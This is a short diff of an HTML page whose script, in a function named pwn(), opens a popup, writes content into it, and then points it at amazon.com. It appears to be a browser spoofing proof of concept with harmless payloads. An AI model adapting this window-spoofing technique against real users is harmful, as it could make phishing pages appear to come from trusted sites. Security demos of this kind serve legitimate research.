@@ -9,9 +9,9 @@
 <body>
 <script>
     function pwn() {
-        v = setInterval(`x=window.open('','test', 'width=400 height=300');x.document.write("<h2>This is not amazon.com!</h2>");`);
+        v = setInterval(`x=window.open('javascript:document.write("hello world!")','test', 'width=400 height=300')`);
         i = setInterval(`
-            x.document.location = "https://www.twitter.com"
+            x.document.location = "https://www.amazon.com"
             clearInterval(v);
             clearInterval(i);
             `, 3333);        
